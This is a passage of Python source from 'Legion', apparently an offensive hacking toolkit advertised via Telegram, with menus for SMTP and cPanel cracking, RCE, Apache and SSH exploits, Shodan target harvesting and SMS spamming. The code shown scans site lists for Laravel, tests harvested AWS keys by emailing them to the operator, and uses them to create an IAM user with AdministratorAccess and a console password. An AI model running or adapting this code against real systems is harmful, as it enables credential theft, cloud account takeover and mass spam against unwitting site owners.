                list = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION WP \033[32;1m+ \033[31;1mBonjour\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#')
                lists = open(list, 'r').read().split('\n')

                print('''
                    1.MultiProcessing
                    2.ThreadPool
                ''')
                chosethrd = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Choice\033[31;1m]\n└─╼\033[32;1m#')
                if chosethrd == '1':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(bagian2, lists)
                if chosethrd == '2':
                    mp = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    pp = Pool(int(mp))
                    pp.map(bagian2, lists)
                else:
                    thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION WP\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(bagian2, listss)
            except:
                print('{}Wrong'.format(fr))
        elif choice == "0":
            printez()
            alege()

#CP WHM zone
def SHODANMenu():
    print(f'''
{red}------- \033[32mLegion SHODAN DOWNLOAD Menu{red} -------
{fc}───┬───────────────
   {fc}└╼ {yl}Shodan APIKEY {fc}[{gr}{apikey}{fc}]
{fc}───┬───────────────
   {fc}└╼ {red}[{gr}1{red}] {fc}Download {res}IP LIST {fc}[{gr}NEW{fc}]
   {fc}└╼ {red}[{gr}2{red}] {fc}Download {res}IP LIST {gr}+ {red}COUNTRY {fc}[{gr}NEW{fc}]
   {fc}└╼ {red}[{gr}3{red}] {fc}Download {red}SHODAN {res}LIST {gr}+ {red}COUNTRY {fc}[{gr}NEW{fc}]
   {fc}└╼ {red}[{gr}4{red}] {fc}Count {red}SHODAN {res}LIST {fc}[{gr}NEW{fc}]
   {fc}└╼ {red}[{gr}5{red}] {fc}Parse {red}SHODAN {res}LIST {fc}[{gr}NEW{fc}]
   {fc}└╼ {red}[{gr}6{red}] {fc}Parse {red}HOST SHODAN {res}LIST {fc}[{gr}NEW{fc}]
{fc}───┬───────────────
   {fc}└╼ {red}[{gr}0{red}] {gr}BACK TO MAIN MENU
''')
def SHODANBot():
    SHODANMenu()
    while True:
        try:
            import shodan
        except ModuleNotFoundError:
            subprocess.call(["pip", "install", 'shodan'])
        finally:
            import shodan
        print(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your {fc}Choice{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
        choice = input('')
        if choice == "1":
            os.system(f'shodan init {apikey}')
            os.system(f'shodan info')
            list = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION\033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me Result Name\033[31;1m]\n└─╼\033[32;1m#')
            debug = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION \033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me Debug Name\033[31;1m]\n└─╼\033[32;1m#')
            os.system(f'shodan download --limit -1 {list} "{debug}"')
        if choice == "2":
            os.system(f'shodan init {apikey}')
            os.system(f'shodan info')
            list = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION\033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me Result Name\033[31;1m]\n└─╼\033[32;1m#')
            debug = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION \033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me Debug Name\033[31;1m]\n└─╼\033[32;1m#')
            country = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION \033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me country Name\033[31;1m]\n└─╼\033[32;1m#')
            os.system(f'shodan download --limit -1 {list} "{debug}" country:{country}')
        if choice == "3":
            os.system(f'shodan init {apikey}')
            os.system(f'shodan info')
            list = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION\033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me Result Name\033[31;1m]\n└─╼\033[32;1m#')
            debug = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION \033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me Debug Name\033[31;1m]\n└─╼\033[32;1m#')
            country = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION \033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me country Name\033[31;1m]\n└─╼\033[32;1m#')
            os.system(f'shodan download --limit -1 {list} "{debug}"')
        if choice == "4":
            os.system(f'shodan init {apikey}')
            os.system(f'shodan info')
            list = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION\033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me Result Name\033[31;1m]\n└─╼\033[32;1m#')
            debug = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION \033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me Debug Name\033[31;1m]\n└─╼\033[32;1m#')
            country = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION \033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me country Name\033[31;1m]\n└─╼\033[32;1m#')
            os.system(f'shodan count "{debug}" country:"{country}"')
        if choice == "5":
            list = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION\033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me the json name\033[31;1m]\n└─╼\033[32;1m#')
            debug = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION \033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me the name for the results\033[31;1m]\n└─╼\033[32;1m#')
            os.system(f'shodan parse --fields ip_str,port --separator : {list} > {debug}')

        if choice == "6":
            list = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION\033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me the json name\033[31;1m]\n└─╼\033[32;1m#')
            debug = input('\033[31;1m┌─\033[31;1m[\033[36;1mLEGION \033[32;1m/ \033[31;1mSHODAN\033[31;1m]--\033[31;1m[\033[32;1mGive me the name for the results\033[31;1m]\n└─╼\033[32;1m#')
            os.system(f'shodan parse --fields hostnames {list} > {debug}')

        elif choice == "0":
            printez()
            alege()

#USA SMS Zone
def SMSMenu():
    print(f'''
{red}------- \033[32mLegion CPANEL/WHM EXPLOIT Menu{red} -------
{fc}───┬───────────────
   {fc}└╼ {red}[{gr}1{red}] SMS {fc}[{red}SENDER{fc}] {gr}ACTIVE  {fc}ONLY USA{res} {gr}[NEW]
   {fc}└╼ {red}[{gr}2{red}] NUMBERS {fc}[{red}GENERATOR {fc}ONLY USA{res} {gr}[NEW]
{fc}───┬───────────────
   {fc}└╼ {red}[{gr}0{red}] {gr}BACK TO MAIN MENU

''')
def SMSBot():
    SMSMenu()
    while True:
        print(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your {fc}Choice{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
        choice = input('')
        if choice == "1":
            USASMSSender()
        elif choice == "2":
            BatchUSGen()
        elif choice == "0":
            printez()
            alege()

#PRINT ZONE Legion


def printez():
    screen_clear()
    print(f'''
{gr}___       __      _______               ______                _____
{fc}__ |     / /_____ ___    |___           ___  / _____ _______ ____(_)______ _______
{yl}__ | /| / / _  _ \__  /| |__  ___/_  _ \__  /  _  _ \__  __ `/__  / _  __ \__  __ \{wh}
{wh}__ |/ |/ /  /  __/_  ___ |_  /    /  __/_  /___/  __/_  /_/ / _  /  / /_/ /_  / / /
{red}____/|__/   \___/ /_/  |_|/_/     \___/ /_____/\___/ _\__, /  /_/   \____/ /_/ /_/
                                                     /____/

{red}━────── •●• {red}PRIV8 {gr}EXPLOIT BOT {red}V {gr}6.7 {red}•●• ──────━
{red}------- \033[32mTelegram{red} -------
{fc}┬───────────────
{fc}└╼ {gr}@{cy}myl3gion{red}]

{red}------- \033[32mSettings{red} -------
{fc}┬───────────────
{fc}└╼ {yl}Your Email is {fc}[{gr}{emailnow}{fc}]
{fc}┬───────────────
{fc}└╼ {yl}You set the timeout to {fc}[{gr}{tomeout}{fc}]
{fc}┬───────────────
{fc}└╼ {yl}Telegram Results {fc}[{gr}{telegram2}{fc}]
{fc}└╼ {yl}Chat id {fc}[{gr}{chat_id}{fc}]
{fc}└╼ {yl}bot_token {fc}[{gr}{bot_token}{fc}]


{gr}──────────────────────────────────────────────────────────
{red}├╼ {red}[{gr}1{red}] {red}LEGION {gr}SMTP CRACKER 6.7 {res}[{gr}ACTIVE{res}]                    {red}|
{gr}|                                                         {gr}|
{red}├╼ {red}[{gr}2{red}] {red}LEGION {gr}RCE {gr}EXPLOIT {res}[{gr}ACTIVE{res}]                         {red}|
{gr}|                                                         {gr}|
{red}├╼ {red}[{gr}3{red}] {red}LEGION {gr}APACHE {gr}EXPLOIT {yl}V5.0 {res}[{gr}ACTIVE{res}]                 {red}|
{gr}|                                                         {gr}|
{red}├╼ {red}[{gr}4{red}] {red}LEGION {fc}USA {gr}SMS{gr} SENDER {res}[{gr}ACTIVE{res}]                      {red}|
{gr}|                                                         {gr}|
{red}├╼ {red}[{gr}5{red}] {red}LEGION {red}PRIVATE {fc}CPANELS {red}& {fc}WHM {gr}CRACKER{gr} {res}[{gr}ACTIVE{res}]       {red}|
{gr}|                                                         {gr}|
{red}├╼ {red}[{gr}6{red}] {red}SHODAN {red}ZONE {fc}Download {red}& {fc}Parse {gr}IP LIST{gr} {res}[{gr}ACTIVE{res}]       {red}|
{gr}|                                                         {gr}|
{red}├╼ {red}[{gr}7{red}] {red}Utility {red}ZONE {res}[{gr}ACTIVE{res}]                               {red}|
{gr}──────────────────────────────────────────────────────────


    ''')
def banner3(bty):
    os.system("cls") if os.name == "nt" else os.system("clear")
    print("{}".format(f"{red}*" * 55))
    print(bty.green("\t\t Private Laravel Pro+\n"))
    print(f"\t   {yl}100% {red}Crack AWS Panel{gr} +{red} Quota\n")

    print(f"\t{gr}Telegram Group{res}: {yl}https://t.me/legion_tools")
    print(f"\t    {gr}DM me{res}: {yl}https://t.me/myl3gion\n")
    print(f"  {gr}Website{res}: {yl}https://mylegion.in {red}& {gr}https://mylegion.in\n")
    print("{}".format(f"{red}*" * 55))
    print("\n")
#from socket import *

def printezlav():
    print(f'''
{red}━────── •●• \033[32mLegion Laravel Menu{red} •●• ──────━
{fc}   ╭━━━❍
   {fc}┃ {red}[{gr}1{red}] {cy}LARAVEL CRACKER \033[0m[\033[32mFAST\033[0m] {gr}+ {fc}Bypass {red}AWS Console \033[32m+ \033[33mSend Valid AWS to your email
   {fc}┃ {red}[{gr}2{red}] {cy}LARAVEL CRACKER \033[0m[\033[32mFAST\033[0m] {gr}+ {fc}Auto get {red}Cpanels & WHM
   {fc}┃ {red}[{gr}3{red}] {cy}LARAVEL CRACKER {gr}\033[33mAuto Check Web Server Ports \033[0m[\033[32mMethod2\033[0m]
   {fc}┃ {red}[{gr}4{red}] {cy}LARAVEL CRACKER {gr}\033[33mAuto create AWS Console {gr}+ {red}QUOTA \033[0m[\033[32mMethod3\033[0m]
   {fc}┃ {red}[{gr}5{red}] {cy}LARAVEL CRACKER {gr}\033[33mAuto get ENV/DEBUG {gr} {fc}[{gr}NEW!{fc}] {red}[{mg}PRIVATE{red}]
   {fc}┃ {red}[{gr}6{red}] {red}PRIV 8 {yl}IP REVERSE {gr}Get Insane Results{red}!
   {fc}┃ {red}[{gr}7{red}] MASS GRAB {red}.Env \033[32m+ \033[30m\033[36mDebug\033[30m
   {fc}┃ {red}[{gr}8{red}] Remove Duplicate\033[36m List!\033[0m
   {fc}┃ {red}[{gr}9{red}] LARAVEL {red}Filter \033[36m\033[0m[{gr}NEW{res}]
   {fc}┃ {red}[{gr}10{red}] MASS CHECK \033[36mAWS LIMIT \033[32m + \033[31mAuto Create IAM\033[0m
   {fc}┃ {red}[{gr}11{red}] MASS CHECK \033[36mTWILIO\033[0m
   {fc}┃ {red}[{gr}12{red}] MASS CHECK \033[36mNEXMO\033[0m
   {fc}┃ {red}[{gr}13{red}] MASS CHECK \033[36mSENDGRID\033[0m {fc}[{yl}Can check 30 sendgrid{fc}] {gr}30 minutes
   {fc}┃ {red}[{gr}14{red}] LARAVEL \033[0mMass \033[32mIP Grab \033[31mfrom \033[36mLeakix
   {fc}┃ {red}[{gr}15{red}] IP GENERATOR\033[36m IPv4\033[33m (Premium)\033[0m {gr}+ {res}Option 5 {red}({gr}REVERSE{red})
   {fc}┃ {red}[{gr}16{red}] IP GENERATOR\033[36m IPv4\033[33m (Premium)\033[0m
   {fc}┃ {red}[{gr}17{red}] SMTP\033[36m CHECKER\033[33m [{gr}NEW]\033[0m
   {fc}┃ {red}[{gr}18{red}] LARAVEL\033[36m CMS FILTER {fc}AUTO CHECK PORTS {yl}[{gr}NEW{yl}]
   {fc}┃ {red}[{gr}19{red}] PRIVATE {yl}LARAVEL{fc} IP RANGER!! {yl}[{gr}NEW{yl}]
   {fc}┃ {red}[{gr}20{red}] NEW SMS SENDER\033[36m TWILIO{yl} [{gr}NEW{yl}]
   {fc}┃ {red}[{gr}21{red}] PRIVATE SSH EXPLOIT{yl} [{gr}NEW{yl}]
   {fc}┃ {red}[{gr}22{red}] IP CHECKER \033[0m[\033[31mVery Fast\033[0m]\033[0m
   {fc}┃ {red}[{gr}23{red}] AWS {fc}CHECK IF SEND {res}EMAIL {red}[{gr}NEW{red}]
   {fc}┃ {red}[{gr}24{red}] AWS {fc}MANUAL CHECK LIMITS{res} ALL REGIONS {red}[{gr}NEW{red}]
   {fc}┃ {red}[{gr}25{red}] SMTP{fc} TESTERS{gr} + Test your Letter {red}[{gr}NEW{red}]
   {fc}┃ {red}[{gr}26{red}] LARAVEL{fc} CMS{gr} MUlti Paths {red}[{gr}NEW{red}]
   {fc}╰ {red}[{gr}27{red}] ASN{fc} IP{gr} GRABBER {red}[{mg}PRIVATE{red}]
    ''')
def laravel6():
    while True:
        print(f'{red}┌─{res}[{cy}Legion Priv8{res}]{gr}─{res}[{mg}/{gr}Give me your Choice{red}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
        choice = input('')
        if choice == "1":
            try:
            	os.mkdir('Results')
            except:
            	pass
            try:
            	os.mkdir('Results/forchecker')
            except:
            	pass
            try:
            	os.mkdir('Results/logsites')
            except:
            	pass
            try:
            	os.mkdir('Results/manual')
            except:
            	pass
            try:
            	os.mkdir('AWS_ByPass')
            except:
            	pass
            try:
            	readcfg = ConfigParser()
            	readcfg.read(pid_restore)
            	lists = readcfg.get('DB', 'FILES')
            	numthread = readcfg.get('DB', 'THREAD')
            	sessi = readcfg.get('DB', 'SESSION')
            	print("log session bot found! restore session")
            	print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
            	tanya = input("Want to contineu session ? [Y/n] ")
            	if "Y" in tanya or "y" in tanya:
            		lerr = open(lists).read().split("\n"+sessi)[1]
            		readsplit = lerr.splitlines()
            	else:
            		kntl # Send Error Biar Lanjut Ke Wxception :v
            except:
            	try:
            		lists = sys.argv[1]
            		numthread = sys.argv[2]
            		readsplit = open(lists).read().splitlines()
            	except:
            		try:
            			lists = input("\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
            			readsplit = open(lists).read().splitlines()
            		except:
            			print("Wrong input or list not found!")
            			exit()
            		try:
            			numthread = input("\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
            		except:
            			print("Wrong thread number!")
            			exit()
            pool = ThreadPool(int(numthread))
            for url in readsplit:
            	if "://" in url:
            		url = url
            	else:
            		url = "http://"+url
            		#url2 = "https://"+url
            	if url.endswith('/'):
            		url = url[:-1]
            	jagases = url
            	try:
            		#pool.add_task(legalegion, url1)
            		pool.add_task(legalegion, url)
            	except KeyboardInterrupt:
            		session = open(pid_restore, 'w')
            		cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
            		session.write(cfgsession)
            		session.close()
            		print("CTRL+C Detect, Session saved")
            		exit()
            pool.wait_completion()
            try:
            	os.remove(pid_restore)
            except:
            	pass
        elif choice == "2":
            try:
            	os.mkdir('Results')
            except:
            	pass
            try:
            	os.mkdir('Results/forchecker')
            except:
            	pass
            try:
            	os.mkdir('Results/logsites')
            except:
            	pass
            try:
            	os.mkdir('Results/manual')
            except:
            	pass
            print("\033[33m If the bot stop work \033[31mor\033[33m not start the \033[36mBeast Mode \033[0m try use the list without \033[31mhttp:// - https://")
            try:
                list = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
                lists = open(list, 'r').read().split('\n')
                print(f'''
        {red}[{gr}1{red}]{res} {yl}MultiProcessing {res}[{gr}Fast{res}]
        {red}[{gr}2{red}]{res} {yl}ThreadPool {res}[{red}Normal{res}]
                ''')
                chosethrd = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mChoice a method\033[31;1m]\n└─╼\033[32;1m#")
                if chosethrd == '1':
                    mp = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
                    pp = Pool(int(mp))
                    pp.map(jembotngw2old, lists)
                else:
                    thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mLegion & BadBoy\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(jembotngw2old, listss)
            except:
                print('{}Wrong'.format(fr))
        elif choice == "3":
            laravel_grabber()
        elif choice == "4":
            try:
            	os.mkdir('AWS_ByPass')
            except:
            	pass
            bty = Beauty()
            banner3(bty)
            main(bty)
        elif choice == "5":
            try:
            	os.mkdir('Results')
            except:
            	pass
            try:
            	os.mkdir('Results/debug')
            	os.mkdir('Results/env')
            except:
            	pass
            bagaincap()
        elif choice == "6":
            try:
            	os.mkdir('Reverse')
            except:
            	pass
            try:
                list = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
                lists = open(list, 'r').read().split('\n')
                print(f'''
        {red}[{gr}1{red}]{res} {yl}MultiProcessing {res}[{gr}Fast{res}]
        {red}[{gr}2{red}]{res} {yl}ThreadPool {res}[{red}Normal{res}]
                ''')
                chosethrd = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mChoice a method\033[31;1m]\n└─╼\033[32;1m#")
                if chosethrd == '1':
                    mp = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
                    pp = Pool(int(mp))
                    pp.map(ranga, lists)
                else:
                    thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mLegion & BadBoy\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(ranga, listss)
            except:
                print('{}Wrong'.format(fr))
        elif choice == "7":
            try:
            	os.mkdir('Debug')
            except:
            	pass
            try:
                list = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
                lists = open(list, 'r').read().split('\n')
                print(f'''
        {red}[{gr}1{red}]{res} {yl}MultiProcessing {res}[{gr}Fast{res}]
        {red}[{gr}2{red}]{res} {yl}ThreadPool {res}[{red}Normal{res}]
                ''')
                chosethrd = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mChoice a method\033[31;1m]\n└─╼\033[32;1m#")
                if chosethrd == '1':
                    mp = input(f"\033[31;1m┌─\033[31;1m[\033[36;1mLegion Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#")
                    pp = Pool(int(mp))
                    pp.map(lega1, lists)
                else:
                    thrdmp = input('\033[31;1m┌─\033[31;1m[\033[36;1mLegion & BadBoy\033[31;1m]--\033[31;1m[\033[33;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#')
                    for listss in lists:
                        with ThreadPoolExecutor(max_workers=int(thrdmp)) as executor:
                            executor.submit(lega1, listss)
            except:
                print('{}Wrong'.format(fr))
        elif choice == "8":
            clean2()
        elif choice == "9":
            try:
            	os.mkdir('CMS')
            except:
            	pass
            def check(url):
                global progres
                try:
                    query = requests.get(url, verify=False, timeout=10)
                    if 'eyJpdiI6I' in str(query.headers):
                        with open(f'CMS/LIVELaravel({fn}).txt', 'a+') as file:
                            file.write(f'{url}\n')
                        with lock:
                            progres = progres + 1
                            print(f'{cy}{progres} {gr}# {res}[{gr}LIVE{res}] {mg}{url}{res}')
                    else:
                        with lock:
                            progres = progres + 1
                            print(f'{cy}{progres} {red}# {res}[{yl}NOT LARAVEL{res}] {mg}{url}{res}')
                except:
                    with lock:
                        progres = progres + 1
                        print(f'{cy}{progres} {red}# {res}[{red}SITE DEAD{res}] {mg}{url}{res}')


            isValid = False
            while not isValid:
                print(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your List{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
                filename = input('').replace('"', '')
                if '.txt' not in filename:
                    filename = f'{filename.split(".")[0]}.txt'
                if not os.path.isfile(filename):
                    print(f'{fg[0]}[!] - Filename Does Not Exist!', end='\r')
                    time.sleep(1)
                    print(' '*40, end='\r')
                else:
                    isValid = True
            tmp = [str(x) for x in open(filename, encoding='utf-8', errors='ignore').read().splitlines() if bool(x)]
            fn = filename.split('.')[0]
            targets = []
            for x in tmp:
                if 'http' not in x:
                    x = f'http://{x}'
                x = '/'.join(x.split('/')[:3])
                targets.append(f'{x}:443')
                targets.append(f'{x}:80')
                targets.append(f'{x}:81')
                targets.append(f'{x}:8081')
                targets.append(f'{x}:8080')
                targets.append(f'{x}:8001')
                targets.append(f'{x}:8086')
                targets.append(f'{x}:8012')

            def worker():
                while True:
                    try:
                        url = targets.pop()
                    except IndexError:
                        break

                    try:
                        check(url)
                    except:
                        pass

            print(f'{red}┌─{res}[{cy}Legion SMTP{res}]{gr}─{res}[{mg}/{gr}Give me your Thread{mg}/{res}]\n{red}└─╼ {res}~{gr}# {res}',end='')
            workers = int(input(''))
            for _ in range(workers):
                t = Thread(target=worker)
                t.start()
        elif choice == "10":
            try:
            	os.mkdir('AWS_Results')
            except:
            	pass
            def kirimawsses(hose,user,password,frome,emailnow):

                print((f"{fc}[{gr}Trying Send SMTP With AWS SES {fc}]\n"))
                try:
                    SENDER = frome+"<"+frome+">"
                    RECIPIENT = emailnow
                    AWS_ACCESS_KEY = user
                    AWS_SECRET_KEY = password
                    AWS_REGION = hose
                    SUBJECT = f"Legion 6.5 [Amazon Test]"
                    BODY_TEXT = ("Legion 6.5 Test AWS\r\n"
                                 "This email was sent with Amazon SES using the AWS SDK"
                                )

                    BODY_HTML = f"""<html>
                    <head></head>
                    <body>
                      <h1>Amazon SES Test</h1>
                      <p>AWS KEY:{AWS_ACCESS_KEY}<br>AWS Secret:{AWS_SECRET_KEY}<br>Region:{AWS_REGION}<br>{frome}<br></p>
                      <p>SMTP:{AWS_ACCESS_KEY}:{AWS_SECRET_KEY}:{AWS_REGION}:{frome}</p>
                      <p>This email was sent with using the AWS SDK From Legion 6.5</p>
                    </body>
                    </html>
                                """
                    CHARSET = "UTF-8"
                    client = boto3.client('ses',region_name=AWS_REGION,aws_access_key_id=AWS_ACCESS_KEY,aws_secret_access_key=AWS_SECRET_KEY)
                    response = client.send_email(
                        Destination={
                            'ToAddresses': [
                                RECIPIENT,
                            ],
                        },
                        Message={
                            'Body': {
                                'Html': {
                                    'Charset': CHARSET,
                                    'Data': BODY_HTML,
                                },
                                'Text': {
                                    'Charset': CHARSET,
                                    'Data': BODY_TEXT,
                                },
                            },
                            'Subject': {
                                'Charset': CHARSET,
                                'Data': SUBJECT,
                            },
                        },
                        Source=SENDER,
                    )
                except Exception as e:
                    print((f"{fc}[{red}AWS {yl}NOT VULN {fc}]\n"))
                    open('AWS_Results/can\'t_send_smtp_ses.txt', 'a').write('email-smtp.'+AWS_REGION+'.amazonaws.com|587|'+AWS_ACCESS_KEY+'|'+AWS_SECRET_KEY+'|'+frome+'\n')
                else:
                    print((f"{fc}[{gr}Email sent!{fc}] {yl}Message ID: "), end=' ')
                    print((response['MessageId']))
                    open('AWS_Results/can_send_smtp_ses.txt', 'a').write('email-smtp.'+AWS_REGION+'.amazonaws.com|587|'+AWS_ACCESS_KEY+'|'+AWS_SECRET_KEY+'|'+frome+'\n')

            def kirimismtp(hose,user,password,frome,emailnow):

                print((f"{fc}[{yl}Trying Send SMTP {gr}Auto {yl}Create SMTP{fc}]\n"))
                try:
                    SENDER = frome
                    SENDERNAME = SENDER
                    RECIPIENT  = emailnow
                    USERNAME_SMTP = user
                    PASSWORD_SMTP = password
                    HOST = hose
                    PORT = 587
                    SUBJECT = 'Mail sent by '+HOST
                    BODY_TEXT = ("Legion 6.5 [Amazon Test]\r\n"

                                )

                    BODY_HTML = f"""<html>
                    <head></head>
                    <body>
                      <h1>SMTP TEST</h1>
                     <p>AWS KEY:{AWS_ACCESS_KEY}<br>AWS Secret:{AWS_SECRET_KEY}<br>Region:{AWS_REGION}<br>{frome}</p>
                     <p>SMTP:{AWS_ACCESS_KEY}:{AWS_SECRET_KEY}:{AWS_REGION}:{frome}</p>
                     <p>This email was sent with using the AWS SDK From Legion 6.5</p>
                    </body>
                    </html>
                                """
                    msg = MIMEMultipart('alternative')
                    msg['Subject'] = SUBJECT
                    msg['From'] = email.utils.formataddr((SENDERNAME, SENDER))
                    msg['To'] = RECIPIENT
                    part1 = MIMEText(BODY_TEXT, 'plain')
                    part2 = MIMEText(BODY_HTML, 'html')
                    msg.attach(part1)
                    msg.attach(part2)
                    server = smtplib.SMTP(HOST, PORT)
                    server.ehlo()
                    server.Davidtls()
                    server.ehlo()
                    server.login(USERNAME_SMTP, PASSWORD_SMTP)
                    server.sendmail(SENDER, RECIPIENT, msg.as_string())
                    server.close()
                except Exception as e:
                    print((f"{fc}[{red}AWS {yl}NOT VULN {fc}]\n"))
                    open('AWS_Results/can\'t_send_smtp.txt', 'a').write(HOST+'|587|'+USERNAME_SMTP+'|'+PASSWORD_SMTP+'|'+frome+'\n')
                else:
                    print((f"{fc}[{gr}{USERNAME_SMTP}{fc}] {yl}From {gr}{frome} {fc}Email sent{red}!"))
                    open('AWS_Results/can_send_smtp.txt', 'a').write(HOST+'|587|'+USERNAME_SMTP+'|'+PASSWORD_SMTP+'|'+frome+'\n')

            def atsmtp(user,pwd,region,emaile,su):
                try:
                    message = "SendRawEmail"
                    version = '\x02'
                    h = hmac.new(pwd, message, digestmod=hashlib.sha256)
                    jembot = base64.b64encode("{0}{1}".format(version, h.digest()))
                    open('AWS_Results/autocreatesmtp.txt', 'a').write('email-smtp.'+region+'.amazonaws.com|587|'+user+'|'+jembot+'|'+emaile+'|'+str(su)+'\n')
                    kirimismtp('email-smtp.'+region+'.amazonaws.com',user,jembot,emaile,emailnow)
                except:
                    pass
                pass

            def goblok(usere,anune,dadine):
                print(f"{fc}[{yl}Try creating {gr}AWS {yl}USER{fc}]\n")
                try:
                    ACCESS_KEY = usere
                    ACCESS_SECRET = anune
                    AWS_REGION = dadine
                    iam = boto3.client('iam', aws_access_key_id=ACCESS_KEY,aws_secret_access_key=ACCESS_SECRET,region_name=AWS_REGION)
                    created_user = iam.create_user(UserName=pubg)
                    if created_user['User']['UserName']:
                        asu = created_user['User']['Arn'].split(':')
                        response = iam.attach_user_policy(UserName = pubg, PolicyArn = 'arn:aws:iam::aws:policy/AdministratorAccess')
                        asus = iam.create_login_profile(UserName=pubg, Password=snoopdog)
                        print((f'{res}[{fc}STATUS{res}{gr} ─ {gr}CREATE USER{mg}/{res}]'))
                        print((f'{res}[{fc}ACCOUNT ID{res}{gr} ─ {gr}{str(asu[4])}{mg}/{res}]'))
                        print((f'{res}[{fc}IAM USERNAME{res}{gr} ─ {gr}'+str(created_user['User']['UserName']+res+']')))
                        print((f'{res}[{fc}PASSWORD{res}{gr} ─ {gr}{str(snoopdog)}{mg}/{res}]'))
